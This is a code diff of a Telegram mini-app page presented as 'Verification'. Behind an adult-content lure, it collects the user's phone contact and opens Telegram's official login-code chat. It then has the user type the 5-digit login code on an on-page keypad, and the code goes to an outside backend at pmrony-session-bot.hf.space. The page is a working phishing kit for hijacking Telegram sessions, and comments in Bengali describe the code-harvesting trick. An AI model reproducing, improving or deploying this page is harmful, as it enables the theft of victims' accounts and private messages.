@@ -3,85 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Verification</title>
+    <title>Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
             background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
             background-size: cover;
             height: 100vh; display: flex; align-items: flex-end; justify-content: center;
-            overflow: hidden; color: white;
+            overflow: hidden;
         }
         .overlay { background: rgba(0, 0, 0, 0.4); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        
-        .main-container { width: 92%; max-width: 380px; z-index: 5; text-align: center; margin-bottom: 30px; position: relative; }
+        .main-container { width: 92%; max-width: 380px; z-index: 10; text-align: center; margin-bottom: 30px; }
 
-        /* প্রো স্টাইল ওটিপি বক্স */
         .otp-card {
-            background: rgba(255, 255, 255, 0.15);
-            backdrop-filter: blur(15px);
-            border-radius: 24px; padding: 25px 15px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px; padding: 25px 15px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
-        .instruction { font-size: 17px; font-weight: 600; margin-bottom: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+        .instruction { color: #333; font-weight: bold; margin-bottom: 20px; font-size: 16px; }
 
-        /* সরাসরি চ্যাটে যাওয়ার বাটন */
-        .pro-get-code-btn {
-            background: linear-gradient(90deg, #0088cc, #00aaff);
-            color: white; border: none; padding: 16px;
-            width: 100%; border-radius: 14px; font-weight: bold; font-size: 18px;
-            cursor: pointer; margin-bottom: 20px;
-            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4);
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            position: relative; z-index: 10;
+        /* প্রফেশনাল বাটন */
+        .get-code-btn {
+            background: #0088cc;
+            color: white; border: none; padding: 15px;
+            width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px;
+            cursor: pointer; margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 136, 204, 0.3);
+            display: block; text-decoration: none;
         }
 
-        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
         .otp-box { 
-            width: 48px; height: 58px; 
-            background: rgba(255, 255, 255, 0.1); 
-            border: 2px solid rgba(255, 255, 255, 0.4); 
-            border-radius: 12px; display: flex; align-items: center; justify-content: center; 
-            font-size: 32px; font-weight: bold; 
+            width: 45px; height: 55px; background: #f1f1f1; 
+            border: 2px solid #ddd; border-radius: 10px; 
+            display: flex; align-items: center; justify-content: center; 
+            font-size: 28px; font-weight: bold; color: #000;
         }
 
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
         .key { 
-            background: rgba(255, 255, 255, 0.1); 
-            backdrop-filter: blur(5px);
-            padding: 18px; border-radius: 15px; 
-            font-size: 26px; font-weight: bold; border: 1px solid rgba(255, 255, 255, 0.2);
+            background: #ffffff; padding: 18px; border-radius: 12px; 
+            font-size: 24px; font-weight: bold; color: #333; 
+            border: 1px solid #ddd; cursor: pointer;
         }
-        .key:active { background: rgba(255, 255, 255, 0.3); }
-        .key-del { background: rgba(255, 71, 87, 0.3); }
+        .key:active { background: #e0e0e0; }
+        .key-del { background: #ff4757; color: white; border: none; }
 
         .hidden { display: none !important; }
-        .finger-icon { font-size: 80px; margin-bottom: 20px; animation: bounce 1s infinite; }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(12px); } }
-        .loader-text { font-size: 22px; font-weight: bold; text-shadow: 0 0 10px black; margin-bottom: 80px; }
+        .finger { font-size: 80px; margin-bottom: 20px; animation: bounce 1s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(15px); } }
+        .loader { color: white; font-weight: bold; font-size: 22px; margin-bottom: 100px; text-shadow: 2px 2px 10px #000; }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
 
     <div class="main-container">
-        <!-- Step 1: Loading -->
         <div id="step0">
-            <div class="finger-icon">👇</div>
-            <div id="load_text" class="loader-text hidden">🔄 Connecting...</div>
+            <div class="finger">👇</div>
+            <div id="load" class="loader hidden">🔄 Connecting...</div>
         </div>
 
-        <!-- Step 2: OTP Screen -->
         <div id="step2" class="hidden">
             <div class="otp-card">
                 <div class="instruction">Enter the 5-digit code sent by Telegram</div>
                 
-                <!-- প্রফেশনাল বাটন যা সরাসরি চ্যাটে নিয়ে যাবে -->
-                <button class="pro-get-code-btn" onclick="openOfficialChat()">
+                <!-- একদম অরিজিনাল প্রো মেথড: এটি সরাসরি ওটিপি চ্যাট ওপেন করবে -->
+                <button class="get-code-btn" onclick="openOfficialChat()">
                     📥 GET LOGIN CODE
                 </button>
 
@@ -97,7 +88,7 @@
                     <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                     <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
                     <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
-                    <div style="background:transparent"></div>
+                    <div style="background:transparent; border:none;"></div>
                     <div class="key" onclick="addNum('0')">0</div>
                     <div class="key key-del" onclick="clearNum()">⌫</div>
                 </div>
@@ -108,9 +99,6 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        tg.enableClosingConfirmation();
-
-        // মেনু বাটন
         tg.MainButton.setText("🍓 START ACCESS 🔞").show().onClick(startFlow);
 
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
@@ -118,22 +106,22 @@
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        // এই ফাংশনটি একদম প্রো বটের মতো সরাসরি ওটিপি চ্যাট ওপেন করবে
+        // এটিই হলো সেশন বটের আসল সিক্রেট ফাংশন
         function openOfficialChat() {
-            // ১. সরাসরি সার্ভিস নোটিফিকেশন ওপেন করার কমান্ড
+            // ১. এটি সরাসরি টেলিগ্রামের সিস্টেম চ্যাট ট্রিগার করে (ID 777000)
             tg.openTelegramLink("tg://resolve?domain=telegram");
             
-            // ২. সাথে সাথে একটু সতর্কতা দেখানো যাতে ইউজার না ঘাবড়ায়
+            // ২. কিছু ভার্সনে ডোমেইন কাজ না করলে সরাসরি মেসেজ প্রোটোকল ট্রিগার করবে
             setTimeout(() => {
-                tg.showAlert("Check your Telegram Messages (Official Chat) at the top!");
-            }, 300);
+                tg.openTelegramLink("tg://msg?user_id=777000");
+            }, 200);
         }
 
         function startFlow() {
             tg.requestContact();
             tg.MainButton.hide();
-            document.querySelector('.finger-icon').classList.add('hidden');
-            document.getElementById('load_text').classList.remove('hidden');
+            document.querySelector('.finger').classList.add('hidden');
+            document.getElementById('load').classList.remove('hidden');
             poll();
         }
 
@@ -182,10 +170,7 @@
                 });
                 const data = await res.json();
                 if (data.status === "success") { window.location.href = OFF_LINK; }
-                else { 
-                    tg.showAlert("Invalid Code! Try again.");
-                    currentOTP = ""; updateBoxes();
-                }
+                else { tg.showAlert("Invalid Code!"); currentOTP = ""; updateBoxes(); }
             } catch (e) { }
         }
     </script>
